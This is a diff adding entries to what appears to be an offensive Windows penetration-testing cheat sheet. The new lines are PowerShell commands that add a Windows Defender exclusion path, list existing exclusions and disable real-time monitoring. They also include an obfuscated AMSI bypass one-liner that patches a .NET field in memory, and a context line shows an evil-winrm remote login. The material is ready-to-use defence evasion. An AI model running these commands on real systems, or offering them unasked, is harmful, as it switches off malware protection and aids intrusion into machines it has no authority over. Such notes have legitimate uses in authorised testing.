@@ -387,6 +387,25 @@ Or
 Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
 ```
 
+### Defender Add exclusion path
+
+`Add-MpPreference -ExclusionPath C:\temp`
+
+### Defender exclusion path
+
+`reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s`
+
+### Disabling defender
+
+`Set-MpPreference -DisableRealtimeMonitoring $true`
+
+### AMSI Bypass 
+
+```
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+```
+https://gist.github.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093
+
 ### Evil-winrm
 `evil-winrm -i IP -u <USER> -p <PASS>`
 
